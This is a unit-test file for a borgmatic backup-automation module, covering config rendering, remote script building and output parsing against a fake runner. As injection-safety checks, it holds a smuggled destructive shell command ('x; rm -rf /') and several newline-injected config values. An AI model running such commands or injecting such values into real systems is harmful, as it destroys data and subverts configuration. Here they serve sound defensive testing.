/**
 * Unit tests for @shrug/borgmatic — pure helpers (version parsing, version-aware
 * rendering, script building, output parsing) plus every method wired against an
 * injected TargetRunner seam. No live host is ever touched.
 */
import {
  assertEquals,
  assertMatch,
  assertNotMatch,
  assertRejects,
  assertThrows,
} from "jsr:@std/assert@1.0.19";
import {
  base64ToStr,
  borgTimeToMs,
  buildConfigureScript,
  buildInitRepoScript,
  buildInstallScript,
  buildStatusScript,
  configPath,
  type ExecResult,
  type GlobalArgs,
  model,
  newestArchiveTime,
  parseBorgmaticVersion,
  parseDryRunFileList,
  parseMarkers,
  redactConfig,
  redactPassphraseLeaks,
  remoteShellArgv,
  renderBorgmaticConfig,
  shQuote,
  sshExec,
  strToBase64,
  styledPattern,
  targetDesc,
  type TargetRunner,
  usesCommandsSyntax,
} from "./borgmatic.ts";

// Schema handle for validation-rejection tests (globalArguments IS the zod schema).
// deno-lint-ignore no-explicit-any
const GARGS = (model as any).globalArguments as {
  parse: (o: unknown) => unknown;
};

// --- test doubles -----------------------------------------------------------

// deno-lint-ignore no-explicit-any
function callExec(fn: unknown, args: unknown, ctx: unknown): Promise<any> {
  return (fn as (a: unknown, c: unknown) => Promise<unknown>)(args, ctx);
}

const nullLogger = {
  debug() {},
  info() {},
  warning() {},
  error() {},
};

interface Written {
  spec: string;
  name: string;
  data: Record<string, unknown>;
}

function fakeContext(globalArgs: GlobalArgs) {
  const writes: Written[] = [];
  const context = {
    globalArgs,
    logger: nullLogger,
    writeResource: (
      spec: string,
      name: string,
      data: Record<string, unknown>,
    ) => {
      writes.push({ spec, name, data });
      return Promise.resolve({ name });
    },
  };
  return { context, writes };
}

/** A scripted runner: match on substrings of the piped script → canned result. */
function scriptedRunner(
  rules: Array<{ match: string; result: Partial<ExecResult> }>,
): { run: TargetRunner; calls: string[] } {
  const calls: string[] = [];
  const run: TargetRunner = (_cfg, script) => {
    calls.push(script);
    for (const r of rules) {
      if (script.includes(r.match)) {
        return Promise.resolve({
          stdout: r.result.stdout ?? "",
          stderr: r.result.stderr ?? "",
          code: r.result.code ?? 0,
        });
      }
    }
    return Promise.resolve({ stdout: "", stderr: "", code: 0 });
  };
  return { run, calls };
}

const baseCfg: GlobalArgs = {
  host: "192.0.2.20",
  sshUser: "root",
  sshPort: 22,
  become: false,
  becomeUser: "root",
  configDir: "/etc/borgmatic",
  configName: "config",
  borgmaticBin: "borgmatic",
  sourceDirectories: [
    "/var/lib/docker/volumes/myapp-config/_data",
  ],
  repositories: [
    {
      path: "ssh://borgwarehouse@192.0.2.10:2222/./abcd1234",
      label: "myapp",
    },
  ],
  sshKeyPath: "/root/.ssh/borg",
  encryptionPassphrase: "s3kr3t-phrase",
  compression: "lz4",
  retention: { keepDaily: 7, keepWeekly: 4, keepMonthly: 6 },
  excludePatterns: [],
  excludePatternStyle: "sh",
  appendOnly: false,
  checks: [],
  hooks: {
    beforeBackup: [
      'sqlite3 /var/lib/docker/volumes/myapp-config/_data/data/db.sqlite3 "PRAGMA wal_checkpoint(TRUNCATE);"',
    ],
  },
  ensureInstalled: true,
  schedule: { onCalendar: "daily", randomizedDelay: "3h", persistent: true },
};

const V19 = { major: 1, minor: 9, raw: "1.9.14" };
const V20 = { major: 2, minor: 0, raw: "2.0.3" };

// --- pure helpers -----------------------------------------------------------

Deno.test("shQuote neutralizes shell metacharacters", () => {
  assertEquals(shQuote("a'b"), "'a'\\''b'");
  assertEquals(shQuote("x; rm -rf /"), "'x; rm -rf /'");
});

Deno.test("base64 round-trips UTF-8", () => {
  const s = 'PRAGMA wal_checkpoint(TRUNCATE); — ünïcödé "q"';
  assertEquals(base64ToStr(strToBase64(s)), s);
});

Deno.test("parseBorgmaticVersion parses and rejects", () => {
  assertEquals(parseBorgmaticVersion("borgmatic 1.9.14").major, 1);
  assertEquals(parseBorgmaticVersion("borgmatic 1.9.14").minor, 9);
  assertEquals(parseBorgmaticVersion("2.0.3").major, 2);
  assertEquals(parseBorgmaticVersion("2.0.3").raw, "2.0.3");
  let threw = false;
  try {
    parseBorgmaticVersion("no version here");
  } catch {
    threw = true;
  }
  assertEquals(threw, true);
});

Deno.test("usesCommandsSyntax branches on major>=2", () => {
  assertEquals(usesCommandsSyntax(V19), false);
  assertEquals(usesCommandsSyntax(V20), true);
});

Deno.test("configPath / targetDesc", () => {
  assertEquals(configPath(baseCfg), "/etc/borgmatic/config.yaml");
  assertEquals(
    configPath({ ...baseCfg, configDir: "/etc/borgmatic/", configName: "bb" }),
    "/etc/borgmatic/bb.yaml",
  );
  assertEquals(targetDesc(baseCfg), "root@192.0.2.20:22");
});

Deno.test("remoteShellArgv honours become/becomeUser", () => {
  assertEquals(remoteShellArgv(baseCfg), ["bash", "-s"]);
  assertEquals(
    remoteShellArgv({ ...baseCfg, become: true }),
    ["sudo", "-n", "bash", "-s"],
  );
  assertEquals(
    remoteShellArgv({ ...baseCfg, become: true, becomeUser: "deploy" }),
    ["sudo", "-n", "-u", "deploy", "bash", "-s"],
  );
});

// --- version-aware rendering ------------------------------------------------

Deno.test("render (1.9) emits before_backup, NOT commands", () => {
  const out = renderBorgmaticConfig(baseCfg, V19);
  assertMatch(out, /before_backup:/);
  assertEquals(/^commands:/m.test(out), false);
  // parity essentials with a real-world template.
  assertMatch(out, /source_directories:/);
  assertMatch(
    out,
    /- path: "ssh:\/\/borgwarehouse@192\.0\.2\.10:2222\/\.\/abcd1234"/,
  );
  assertMatch(out, /label: "myapp"/);
  assertMatch(out, /encryption_passphrase: "s3kr3t-phrase"/);
  assertMatch(
    out,
    /ssh_command: "ssh -i '\/root\/\.ssh\/borg' -o StrictHostKeyChecking=accept-new"/,
  );
  assertMatch(out, /compression: "lz4"/);
  assertMatch(out, /keep_daily: 7/);
  assertMatch(out, /keep_weekly: 4/);
  assertMatch(out, /keep_monthly: 6/);
  assertMatch(out, /PRAGMA wal_checkpoint\(TRUNCATE\);/);
});

Deno.test("render (2.0) emits commands, NOT before_backup", () => {
  const out = renderBorgmaticConfig(baseCfg, V20);
  assertMatch(out, /^commands:/m);
  assertMatch(out, /before: action/);
  assertMatch(out, /when:/);
  assertMatch(out, /- create/);
  assertEquals(/before_backup:/.test(out), false);
});

Deno.test("render supports encryption_passcommand (no inline passphrase)", () => {
  const out = renderBorgmaticConfig(
    {
      ...baseCfg,
      encryptionPassphrase: undefined,
      encryptionPasscommand: "pass show x",
    },
    V19,
  );
  assertMatch(out, /encryption_passcommand: "pass show x"/);
  assertEquals(/encryption_passphrase:/.test(out), false);
});

Deno.test("render supports native sqlite databases hook", () => {
  const out = renderBorgmaticConfig(
    {
      ...baseCfg,
      hooks: {
        databases: [{ type: "sqlite", name: "bb", path: "/data/db.sqlite3" }],
      },
    },
    V19,
  );
  assertMatch(out, /sqlite_databases:/);
  assertMatch(out, /- name: "bb"/);
  assertMatch(out, /path: "\/data\/db\.sqlite3"/);
});

Deno.test("render optional retention knobs", () => {
  const out = renderBorgmaticConfig(
    {
      ...baseCfg,
      retention: {
        keepHourly: 3,
        keepDaily: 7,
        keepWeekly: 4,
        keepMonthly: 6,
        keepYearly: 1,
      },
    },
    V19,
  );
  assertMatch(out, /keep_hourly: 3/);
  assertMatch(out, /keep_yearly: 1/);
});

Deno.test("render validates required fields", () => {
  let n = 0;
  for (
    const bad of [
      { ...baseCfg, sourceDirectories: [] },
      { ...baseCfg, repositories: [] },
      {
        ...baseCfg,
        encryptionPassphrase: undefined,
        encryptionPasscommand: undefined,
      },
    ]
  ) {
    try {
      renderBorgmaticConfig(bad, V19);
    } catch {
      n++;
    }
  }
  assertEquals(n, 3);
});

Deno.test("redactConfig hides the inline passphrase", () => {
  const out = renderBorgmaticConfig(baseCfg, V19);
  const red = redactConfig(out);
  assertEquals(/s3kr3t-phrase/.test(red), false);
  assertMatch(red, /encryption_passphrase: "<redacted>"/);
});

// --- backward-compat goldens ------------------------------------------------
// The four pub-15 additions are all default-off, so a config with none of them
// set MUST render byte-identical to the pre-pub-15 output. These full-string
// goldens lock that. (The header line carries the same literal em-dash the
// rendered config header comment contains, so the match is exact.)

const GOLDEN_HEAD = [
  "# Managed by swamp (@shrug/borgmatic). Do not edit by hand — the source of",
  "# truth is the swamp model that renders this file.",
  "source_directories:",
  '    - "/var/lib/docker/volumes/myapp-config/_data"',
  "",
  "repositories:",
  '    - path: "ssh://borgwarehouse@192.0.2.10:2222/./abcd1234"',
  '      label: "myapp"',
  "",
  'encryption_passphrase: "s3kr3t-phrase"',
  `ssh_command: "ssh -i '/root/.ssh/borg' -o StrictHostKeyChecking=accept-new"`,
  'compression: "lz4"',
  "",
  "keep_daily: 7",
  "keep_weekly: 4",
  "keep_monthly: 6",
  "",
];
// The before/after hook quoted value (identical across 1.9 and 2.0).
const HOOK_Q =
  '"sqlite3 /var/lib/docker/volumes/myapp-config/_data/data/db.sqlite3 \\"PRAGMA wal_checkpoint(TRUNCATE);\\""';
const GOLDEN_19 = [
  ...GOLDEN_HEAD,
  "# borgmatic 1.9.x legacy hook (the 2.0 `commands:` syntax is not supported here).",
  "before_backup:",
  `    - ${HOOK_Q}`,
  "",
].join("\n");
const GOLDEN_20 = [
  ...GOLDEN_HEAD,
  "commands:",
  "    - before: action",
  "      when:",
  "          - create",
  "      run:",
  `          - ${HOOK_Q}`,
  "",
].join("\n");

Deno.test("backward-compat: render(1.9) golden unchanged with all new features off", () => {
  assertEquals(renderBorgmaticConfig(baseCfg, V19), GOLDEN_19);
});

Deno.test("backward-compat: render(2.0) golden unchanged with all new features off", () => {
  assertEquals(renderBorgmaticConfig(baseCfg, V20), GOLDEN_20);
});

Deno.test("backward-compat: redact golden unchanged with all new features off", () => {
  const red = redactConfig(renderBorgmaticConfig(baseCfg, V19));
  assertEquals(
    red,
    GOLDEN_19.replace(
      'encryption_passphrase: "s3kr3t-phrase"',
      'encryption_passphrase: "<redacted>"',
    ),
  );
});

Deno.test("backward-compat: default-off omits all four new keys", () => {
  const out = renderBorgmaticConfig(baseCfg, V19);
  assertEquals(/exclude_patterns:/.test(out), false);
  assertEquals(/skip_actions:/.test(out), false);
  assertEquals(/^checks:/m.test(out), false);
});

// --- A1: exclude_patterns ----------------------------------------------------

Deno.test("styledPattern prefixes bare patterns, passes explicit prefixes through", () => {
  assertEquals(styledPattern("/home/user/.cache", "sh"), "sh:/home/user/.cache");
  // every explicit prefix is passed through untouched
  for (const pre of ["fm", "sh", "re", "pp", "pf"]) {
    assertEquals(styledPattern(`${pre}:/x`, "sh"), `${pre}:/x`);
  }
  // style override is honoured for bare patterns
  assertEquals(styledPattern("/x", "fm"), "fm:/x");
});

Deno.test("exclude_patterns: one entry per line, style-prefixed, never space-joined", () => {
  const out = renderBorgmaticConfig(
    {
      ...baseCfg,
      excludePatterns: ["/home/user/.cache", "/home/user/dev/client-a"],
    },
    V19,
  );
  const lines = out.split("\n");
  const i = lines.findIndex((l) => l === "exclude_patterns:");
  assertEquals(i >= 0, true);
  // bare patterns get the default sh: prefix, one per line.
  assertEquals(lines[i + 1], '    - "sh:/home/user/.cache"');
  assertEquals(lines[i + 2], '    - "sh:/home/user/dev/client-a"');
  // NEVER space-joined into a single entry.
  assertNotMatch(out, /\.cache"\s+"?sh:/);
  assertNotMatch(out, /\.cache sh:/);
});

Deno.test("exclude_patterns: style override + explicit-prefix passthrough in render", () => {
  const out = renderBorgmaticConfig(
    { ...baseCfg, excludePatternStyle: "fm", excludePatterns: ["/a", "re:^/b$"] },
    V19,
  );
  assertMatch(out, /^ {4}- "fm:\/a"$/m);
  assertMatch(out, /^ {4}- "re:\^\/b\$"$/m); // explicit re: NOT double-prefixed
  assertNotMatch(out, /"fm:re:/);
});

Deno.test("exclude_patterns omitted when none configured (default off)", () => {
  assertEquals(/exclude_patterns:/.test(renderBorgmaticConfig(baseCfg, V19)), false);
});

// A depersonalized fixture mirroring the SHAPE of change-47's real exclude list
// (real tenant/employer identifiers scrubbed): every entry ABSOLUTE-anchored
// under a home root, mixing client/employer tenant paths, glob worktree paths,
// and scoped cache globs. Pinned to its rendered form so a regression to
// unanchored or over-floated (**/) patterns fails CI (plan-review F1).
const CHANGE47_EXCLUDES = [
  "/home/user/Nextcloud/Clients",
  "/home/user/.local/share/mail/user@employer.example",
  "/home/user/dev/client-a",
  "/home/user/dev/client-b",
  "/home/user/dev/go/pkg",
  "/home/user/.herdr/worktrees/client-c-*",
  "/home/user/.herdr/worktrees/*client-b*",
  "/home/user/.herdr/worktrees/*contractor*",
  "/home/user/recovery-20260101",
  "/home/user/.cache",
  "/home/user/.local/share/Trash",
  "/home/user/.config/*/Cache",
  "/home/user/.var/app/*/*/Cache",
];

Deno.test("exclude_patterns: change-47 real list renders anchored-absolute (regression guard)", () => {
  const out = renderBorgmaticConfig(
    { ...baseCfg, excludePatterns: CHANGE47_EXCLUDES },
    V19,
  );
  const lines = out.split("\n");
  const start = lines.findIndex((l) => l === "exclude_patterns:");
  assertEquals(start >= 0, true);
  const rendered = lines.slice(start + 1, start + 1 + CHANGE47_EXCLUDES.length);
  // EXACT pinned rendered form: default sh: style + absolute anchor, one per line.
  assertEquals(rendered, CHANGE47_EXCLUDES.map((p) => `    - "sh:${p}"`));
  // Regression guard: every pattern is absolute-anchored; none floated with **/.
  for (const l of rendered) {
    assertMatch(l, /^ {4}- "sh:\/home\/user\//);
    assertNotMatch(l, /"sh:\*\*\//);
  }
});

// --- A2/C: skip_actions (append-only) ---------------------------------------

Deno.test("skip_actions: appendOnly expands to [prune, compact]", () => {
  const out = renderBorgmaticConfig({ ...baseCfg, appendOnly: true }, V19);
  const lines = out.split("\n");
  const i = lines.findIndex((l) => l === "skip_actions:");
  assertEquals(i >= 0, true);
  assertEquals(lines[i + 1], "    - prune");
  assertEquals(lines[i + 2], "    - compact");
});

Deno.test("skip_actions: skipActions overrides appendOnly", () => {
  const out = renderBorgmaticConfig(
    { ...baseCfg, appendOnly: true, skipActions: ["check"] },
    V19,
  );
  assertMatch(out, /skip_actions:\n {4}- check/);
  // the appendOnly default [prune, compact] is fully overridden, not merged.
  assertEquals(/^ {4}- prune$/m.test(out), false);
  assertEquals(/^ {4}- compact$/m.test(out), false);
});

Deno.test("skip_actions omitted when appendOnly off and no skipActions (default off)", () => {
  assertEquals(/skip_actions:/.test(renderBorgmaticConfig(baseCfg, V19)), false);
});

Deno.test("appendOnly composes with a checks: block without re-enabling prune/compact", () => {
  const out = renderBorgmaticConfig(
    {
      ...baseCfg,
      appendOnly: true,
      checks: [
        { name: "repository", frequency: "1 day" },
        { name: "data", frequency: "1 month" },
      ],
    },
    V19,
  );
  // append-only skips prune+compact ...
  assertMatch(out, /skip_actions:\n {4}- prune\n {4}- compact/);
  // ... and the read-only checks: block composes alongside it ...
  assertMatch(out, /checks:\n {4}- name: repository\n {6}frequency: "1 day"/);
  assertMatch(out, /- name: data\n {6}frequency: "1 month"/);
  // ... with no contradiction: check is NOT skipped, prune/compact NOT re-run.
  assertEquals(/^ {4}- check$/m.test(out), false);
});

// --- A3: checks frequency throttling ----------------------------------------

Deno.test("checks: render name (+ optional frequency); default off omits", () => {
  assertEquals(/^checks:/m.test(renderBorgmaticConfig(baseCfg, V19)), false);
  const out = renderBorgmaticConfig(
    {
      ...baseCfg,
      checks: [{ name: "archives", frequency: "2 weeks" }, { name: "spot" }],
    },
    V19,
  );
  assertMatch(
    out,
    /checks:\n {4}- name: archives\n {6}frequency: "2 weeks"\n {4}- name: spot\n/,
  );
  // a check with no frequency renders the name only (no frequency line).
  assertNotMatch(out, /name: spot\n {6}frequency:/);
});

Deno.test("checks: schema rejects malformed / newline-injected frequency", () => {
  // valid forms accepted.
  GARGS.parse({ host: "h", checks: [{ name: "repository", frequency: "1 day" }] });
  GARGS.parse({ host: "h", checks: [{ name: "data", frequency: "always" }] });
  GARGS.parse({ host: "h", checks: [{ name: "data" }] });
  // space-less form rejected (regex requires a single literal space).
  assertThrows(() =>
    GARGS.parse({ host: "h", checks: [{ name: "data", frequency: "1day" }] })
  );
  // newline-injection rejected (literal space, NOT \s+, so no newline match).
  assertThrows(() =>
    GARGS.parse({
      host: "h",
      checks: [{ name: "data", frequency: "1 day\nskip_actions: []" }],
    })
  );
  // unknown unit + unknown check name rejected.
  assertThrows(() =>
    GARGS.parse({ host: "h", checks: [{ name: "data", frequency: "1 fortnight" }] })
  );
  assertThrows(() => GARGS.parse({ host: "h", checks: [{ name: "bogus" }] }));
});

Deno.test("excludePatterns: schema rejects newline-injected entries", () => {
  // legitimate patterns accepted (bare, prefixed, and empty default).
  GARGS.parse({ host: "h", excludePatterns: ["/home/user/.cache", "re:^/b$"] });
  GARGS.parse({ host: "h" });
  // newline-injection rejected (entry is rendered verbatim into a yamlDq scalar
  // that does not escape newlines).
  assertThrows(() =>
    GARGS.parse({
      host: "h",
      excludePatterns: ["/a\nrepositories: []"],
    })
  );
  // carriage return rejected too.
  assertThrows(() =>
    GARGS.parse({ host: "h", excludePatterns: ["/a\rfoo"] })
  );
});

// --- script builders --------------------------------------------------------

Deno.test("install script is idempotent + covers apt and dnf", () => {
  const s = buildInstallScript(baseCfg);
  assertMatch(s, /command -v 'borgmatic'/);
  assertMatch(s, /apt-get install -y borgbackup borgmatic sqlite3/);
  assertMatch(s, /dnf install -y borgbackup borgmatic sqlite/);
});

Deno.test("configure script: keygen guard, apply-gate, atomic swap, timer", () => {
  const s = buildConfigureScript(baseCfg, "RENDERED\n");
  assertMatch(s, /if \[ ! -f "\$KEYP" \]; then/);
  assertMatch(s, /ssh-keygen -t ed25519/);
  // apply-gate: validate the temp file BEFORE swapping.
  assertMatch(s, /'borgmatic' -c "\$TMP" config validate/);
  assertMatch(s, /mv -f "\$TMP" '\/etc\/borgmatic\/config\.yaml'/);
  // timer drop-in when schedule is set.
  assertMatch(s, /borgmatic\.timer\.d/);
  assertMatch(s, /systemctl enable --now borgmatic\.timer/);
});

Deno.test("configure script omits timer when schedule unset", () => {
  const s = buildConfigureScript({ ...baseCfg, schedule: undefined }, "X\n");
  assertEquals(/systemctl enable --now borgmatic\.timer/.test(s), false);
});

Deno.test("configure script emits the PUBKEY_B64 marker OUTSIDE the keygen if/else", () => {
  const s = buildConfigureScript(baseCfg, "RENDERED\n");
  assertMatch(s, /SWAMP_BORG_PUBKEY_B64=\$\(base64 -w0 < "\$KEYP\.pub"/);
  // it is emitted after the keygen block's closing `fi` (unconditional), not
  // nested inside either the generate or the skip branch.
  const fiIdx = s.indexOf("\nfi\n");
  const pubIdx = s.indexOf("SWAMP_BORG_PUBKEY_B64=");
  assertEquals(fiIdx >= 0 && pubIdx > fiIdx, true);
  // and it precedes the render/validate stage.
  assertEquals(pubIdx < s.indexOf("config validate"), true);
});

Deno.test("initRepo script guards repo-create with repo-info", () => {
  const s = buildInitRepoScript(baseCfg, "repokey-blake2");
  assertMatch(s, /repo-info >\/dev\/null 2>&1; then/);
  assertMatch(s, /repo-create --encryption 'repokey-blake2'/);
});

Deno.test("status script probes config/timer/last-archive", () => {
  const s = buildStatusScript(baseCfg);
  assertMatch(s, /config validate/);
  assertMatch(s, /systemctl is-active borgmatic\.timer/);
  assertMatch(s, /repo-list --json --last 1/);
});

// --- output parsing ---------------------------------------------------------

Deno.test("parseMarkers extracts KEY=VALUE lines", () => {
  const mk = parseMarkers(
    "noise\nSWAMP_BORG_ST_VALIDATE=0\nSWAMP_BORG_ST_TIMER_ACTIVE=active\n",
  );
  assertEquals(mk.ST_VALIDATE, "0");
  assertEquals(mk.ST_TIMER_ACTIVE, "active");
});

Deno.test("borgTimeToMs treats naive borg times as UTC", () => {
  // naive (no tz) → UTC, NOT local; equals the explicit-Z instant.
  assertEquals(
    borgTimeToMs("2026-07-16T16:22:50.000000"),
    Date.parse("2026-07-16T16:22:50.000000Z"),
  );
  // an explicit tz is respected as-is.
  assertEquals(
    borgTimeToMs("2026-07-16T16:22:50+00:00"),
    Date.parse("2026-07-16T16:22:50Z"),
  );
});

Deno.test("newestArchiveTime finds max time across shapes", () => {
  const arr = JSON.stringify([
    {
      archives: [{ name: "a", time: "2026-07-15T01:00:00" }, {
        name: "b",
        time: "2026-07-16T02:00:00",
      }],
    },
  ]);
  assertEquals(newestArchiveTime(arr), "2026-07-16T02:00:00");
  assertEquals(newestArchiveTime(JSON.stringify({ archives: [] })), null);
  assertEquals(newestArchiveTime(""), null);
  assertEquals(newestArchiveTime("not json"), null);
});

// --- methods wired through the seam ----------------------------------------

Deno.test("configure: happy path writes config + attempt (1.9 → before_backup)", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const { run, calls } = scriptedRunner([
    { match: "--version", result: { stdout: "borgmatic 1.9.14\n" } },
    {
      match: "config validate",
      result: {
        stdout:
          "SWAMP_BORG_KEYGEN_SKIP\nSWAMP_BORG_VALIDATE_OK\nSWAMP_BORG_CONFIG_OK\nSWAMP_BORG_TIMER_OK\n",
      },
    },
  ]);
  const res = await callExec(
    model.methods.configure.execute,
    { _run: run },
    context,
  );
  assertEquals(res.dataHandles.length, 2);
  const cfgRes = writes.find((w) => w.spec === "config");
  assertEquals(cfgRes?.data.borgmaticVersion, "1.9.14");
  assertEquals(cfgRes?.data.hookStyle, "before_backup");
  assertEquals(cfgRes?.data.validated, true);
  assertEquals(cfgRes?.data.timerEnabled, true);
  // passphrase never persisted.
  assertEquals(/s3kr3t-phrase/.test(JSON.stringify(cfgRes?.data)), false);
  const att = writes.find((w) => w.spec === "attempt");
  assertEquals(att?.data.success, true);
  // install runs first (ensureInstalled), then version detection before writing.
  assertMatch(calls[0], /command -v 'borgmatic'/);
  assertMatch(calls[1], /--version/);
});

Deno.test("configure: surfaces borgPublicKey from the PUBKEY_B64 marker", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const pubtext = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 borg@192.0.2.20\n";
  const b64 = strToBase64(pubtext);
  const { run } = scriptedRunner([
    { match: "--version", result: { stdout: "borgmatic 1.9.14\n" } },
    {
      match: "config validate",
      result: {
        stdout: `SWAMP_BORG_KEYGEN_DONE\nSWAMP_BORG_PUBKEY_B64=${b64}\n` +
          "SWAMP_BORG_VALIDATE_OK\nSWAMP_BORG_CONFIG_OK\nSWAMP_BORG_TIMER_OK\n",
      },
    },
  ]);
  await callExec(model.methods.configure.execute, { _run: run }, context);
  const cfgRes = writes.find((w) => w.spec === "config");
  // decoded + trimmed (trailing newline from the key file dropped).
  assertEquals(cfgRes?.data.borgPublicKey, pubtext.trim());
});

Deno.test("configure: empty PUBKEY_B64 marker maps to null borgPublicKey", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const { run } = scriptedRunner([
    { match: "--version", result: { stdout: "borgmatic 1.9.14\n" } },
    {
      match: "config validate",
      result: {
        stdout: "SWAMP_BORG_KEYGEN_SKIP\nSWAMP_BORG_PUBKEY_B64=\n" +
          "SWAMP_BORG_VALIDATE_OK\nSWAMP_BORG_CONFIG_OK\nSWAMP_BORG_TIMER_OK\n",
      },
    },
  ]);
  await callExec(model.methods.configure.execute, { _run: run }, context);
  const cfgRes = writes.find((w) => w.spec === "config");
  assertEquals(cfgRes?.data.borgPublicKey, null);
});

Deno.test("configure: validate failure records failed attempt and throws", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const { run } = scriptedRunner([
    { match: "--version", result: { stdout: "borgmatic 1.9.14\n" } },
    {
      match: "config validate",
      result: { stdout: "", stderr: "SWAMP_BORG_VALIDATE_FAIL\n", code: 48 },
    },
  ]);
  await assertRejects(
    () => callExec(model.methods.configure.execute, { _run: run }, context),
    Error,
    "configure failed",
  );
  const att = writes.find((w) => w.spec === "attempt");
  assertEquals(att?.data.success, false);
  assertEquals(att?.data.exitCode, 48);
  // no config resource on failure.
  assertEquals(writes.some((w) => w.spec === "config"), false);
});

Deno.test("configure: unparseable version aborts before writing config", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const { run } = scriptedRunner([
    { match: "--version", result: { stdout: "garbled\n" } },
  ]);
  await assertRejects(() =>
    callExec(model.methods.configure.execute, { _run: run }, context)
  );
  assertEquals(writes.some((w) => w.spec === "config"), false);
});

Deno.test("initRepo: created vs already-exists", async () => {
  // created
  {
    const { context, writes } = fakeContext(baseCfg);
    const { run } = scriptedRunner([
      { match: "repo-create", result: { stdout: "SWAMP_BORG_REPO_CREATED\n" } },
    ]);
    await callExec(model.methods.initRepo.execute, {
      encryption: "repokey-blake2",
      _run: run,
    }, context);
    assertEquals(writes.find((w) => w.spec === "repoInit")?.data.created, true);
  }
  // already exists (idempotent skip)
  {
    const { context, writes } = fakeContext(baseCfg);
    const { run } = scriptedRunner([
      { match: "repo-create", result: { stdout: "SWAMP_BORG_REPO_EXISTS\n" } },
    ]);
    await callExec(model.methods.initRepo.execute, {
      encryption: "repokey-blake2",
      _run: run,
    }, context);
    assertEquals(
      writes.find((w) => w.spec === "repoInit")?.data.created,
      false,
    );
  }
});

Deno.test("initRepo: auth failure surfaces the register-key hint", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const { run } = scriptedRunner([
    {
      match: "repo-create",
      result: { stderr: "Connection refused\n", code: 52 },
    },
  ]);
  await assertRejects(
    () =>
      callExec(model.methods.initRepo.execute, {
        encryption: "repokey-blake2",
        _run: run,
      }, context),
    Error,
    "register",
  );
  assertEquals(writes.find((w) => w.spec === "attempt")?.data.success, false);
});

Deno.test("backup: parses archive name from --stats output", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const { run } = scriptedRunner([
    {
      match: "create",
      result: {
        stdout: "Archive name: host-2026-07-16T12:00:00\nStats...\n",
      },
    },
  ]);
  await callExec(
    model.methods.backup.execute,
    { dryRun: false, _run: run },
    context,
  );
  const b = writes.find((w) => w.spec === "backup");
  assertEquals(b?.data.archiveName, "host-2026-07-16T12:00:00");
  assertEquals(writes.find((w) => w.spec === "attempt")?.data.success, true);
});

Deno.test("backup: transport failure (255) → failed attempt + throw", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const { run } = scriptedRunner([
    { match: "create", result: { stderr: "ssh: connect", code: 255 } },
  ]);
  await assertRejects(() =>
    callExec(
      model.methods.backup.execute,
      { dryRun: false, _run: run },
      context,
    )
  );
  assertEquals(writes.find((w) => w.spec === "attempt")?.data.success, false);
});

Deno.test("parseDryRunFileList: strips status prefix, keeps absolute paths", () => {
  const out = parseDryRunFileList(
    [
      "- /home/user/myapp/config.yaml",
      "A /home/user/myapp/data/db.sqlite3",
      "M /home/user/myapp/logs/app.log",
      "U /home/user/myapp/static/logo.png",
      'Creating archive at "ssh://example/repo::host-2026-07-16"',
      "Archive name: host-2026-07-16T12:00:00",
      "Number of files: 4",
      "relative/not/absolute.txt",
      "",
    ].join("\n"),
  );
  assertEquals(out, [
    "/home/user/myapp/config.yaml",
    "/home/user/myapp/data/db.sqlite3",
    "/home/user/myapp/logs/app.log",
    "/home/user/myapp/static/logo.png",
  ]);
});

Deno.test("backup: dryRun adds --list and parses files/fileCount", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const { run, calls } = scriptedRunner([
    {
      match: "create",
      result: {
        stdout: [
          "- /home/user/myapp/config.yaml",
          "- /home/user/myapp/data/db.sqlite3",
          "Archive name: host-2026-07-16T12:00:00",
          "Number of files: 2",
        ].join("\n"),
      },
    },
  ]);
  await callExec(
    model.methods.backup.execute,
    { dryRun: true, _run: run },
    context,
  );
  // The built borg action carries --list on a dry-run.
  assertEquals(calls.some((s) => s.includes("--list")), true);
  const b = writes.find((w) => w.spec === "backup");
  assertEquals(b?.data.files, [
    "/home/user/myapp/config.yaml",
    "/home/user/myapp/data/db.sqlite3",
  ]);
  assertEquals(b?.data.fileCount, 2);
  assertEquals(b?.data.dryRun, true);
});

Deno.test("backup: real run leaves files/fileCount null and omits --list", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const { run, calls } = scriptedRunner([
    {
      match: "create",
      result: { stdout: "Archive name: host-2026-07-16T12:00:00\nStats...\n" },
    },
  ]);
  await callExec(
    model.methods.backup.execute,
    { dryRun: false, _run: run },
    context,
  );
  assertEquals(calls.some((s) => s.includes("--list")), false);
  const b = writes.find((w) => w.spec === "backup");
  assertEquals(b?.data.files, null);
  assertEquals(b?.data.fileCount, null);
});

Deno.test("prune/compact/check: op resource + attempt", async () => {
  for (
    const [verb, marker] of [["prune", "prune"], ["compact", "compact"], [
      "check",
      "check",
    ]] as const
  ) {
    const { context, writes } = fakeContext(baseCfg);
    const { run } = scriptedRunner([{
      match: marker,
      result: { stdout: "ok\n" },
    }]);
    // deno-lint-ignore no-explicit-any
    await callExec(
      (model.methods as any)[verb].execute,
      { _run: run },
      context,
    );
    assertEquals(writes.find((w) => w.spec === "op")?.data.op, verb);
    assertEquals(writes.find((w) => w.spec === "attempt")?.data.success, true);
  }
});

Deno.test("listArchives: parses repo-list json → count + newest", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const listJson = JSON.stringify([
    { archives: [{ name: "a", time: "2026-07-16T02:00:00" }] },
  ]);
  const { run } = scriptedRunner([{
    match: "repo-list",
    result: { stdout: listJson },
  }]);
  await callExec(model.methods.listArchives.execute, { _run: run }, context);
  const a = writes.find((w) => w.spec === "archives");
  assertEquals(a?.data.archiveCount, 1);
  assertEquals(a?.data.newestArchiveTime, "2026-07-16T02:00:00");
});

Deno.test("status: healthy when config valid + timer active + recent archive", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const recent = new Date(Date.now() - 3_600_000).toISOString(); // 1h ago
  const lastJson = JSON.stringify([{
    archives: [{ name: "a", time: recent }],
  }]);
  const b64 = strToBase64(lastJson);
  const stdout = [
    "SWAMP_BORG_ST_CONFIG_PRESENT=1",
    "SWAMP_BORG_ST_VALIDATE=0",
    "SWAMP_BORG_ST_TIMER_ACTIVE=active",
